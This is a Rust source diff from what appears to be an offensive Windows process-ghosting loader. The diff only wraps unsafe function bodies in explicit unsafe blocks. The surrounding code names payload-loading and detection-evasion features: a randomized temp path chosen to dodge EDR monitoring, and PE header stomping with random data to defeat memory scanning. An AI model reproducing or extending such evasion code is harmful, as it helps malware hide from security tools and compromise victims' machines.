@@ -43,7 +43,7 @@ impl State {
         }
     }
 
-    pub unsafe fn rollback(&mut self) {
+    pub unsafe fn rollback(&mut self) { unsafe {
         nt::nt_close(self.thread_handle);
         self.thread_handle = null_mut();
 
@@ -56,10 +56,10 @@ impl State {
 
         nt::nt_close(self.file_handle);
         self.file_handle = null_mut();
-    }
+    }}
 }
 
-pub unsafe fn ghost_process(config: &Config) -> Option<State> {
+pub unsafe fn ghost_process(config: &Config) -> Option<State> { unsafe {
     if config.pe_payload.is_empty() { return None; }
 
     // Validate PE signature
@@ -474,14 +474,14 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     debug!("[GHOST] PEB:            {:p}", process_basic_information.peb_base_address);
 
     Some(state)  
-}
+}}
 
 /**
  * Per user temp directory instead of C:\Windows\Temp: \??\C:\Windows\Temp -> requires elevation and it's monitored by EDRs
  * Instead \??\C:\Users\<user>\AppData\Local\Temp would be ideal but we dont know the use name, use C:\Windows\Temp with randomized prefix
  * Each build selects a random prefix based on RDTSC
  * */
-unsafe fn generate_temp_path() -> [u16; 48] {
+unsafe fn generate_temp_path() -> [u16; 48] { unsafe {
     let mut path: [u16; 48] = [0u16; 48];
 
 
@@ -549,13 +549,13 @@ unsafe fn generate_temp_path() -> [u16; 48] {
     path[i] = 0x0000; // terminator
 
     path
-}
+}}
 
 
 /**
  * Calculate the size of the duble null terminated environment block
  * */
-unsafe fn get_environment_size(environment: *mut c_void) -> usize {
+unsafe fn get_environment_size(environment: *mut c_void) -> usize { unsafe {
     if environment.is_null() {
         return 0;
     }
@@ -568,7 +568,7 @@ unsafe fn get_environment_size(environment: *mut c_void) -> usize {
         }
         p = p.add(1);
     }
-}
+}}
 
 
 /**
@@ -576,7 +576,7 @@ unsafe fn get_environment_size(environment: *mut c_void) -> usize {
  * Fills the ful 0x1000 bytes header page with pseudo random data to prevet memory resident PE scanning.
  * Random data is less scannable then all zeros, (which is itself a detectable patern for header stomping)
  * */
-unsafe fn stomp_pe_headers(process: HANDLE, image_base: *mut c_void) {
+unsafe fn stomp_pe_headers(process: HANDLE, image_base: *mut c_void) { unsafe {
     if process.is_null() || image_base.is_null() {
         return;
     }
@@ -634,4 +634,4 @@ unsafe fn stomp_pe_headers(process: HANDLE, image_base: *mut c_void) {
     if status == STATUS_SUCCESS {
         debug!("[GHOST] PE header stomped ({} bytes of entropy)", bytes_written);
     }
-}
+}}
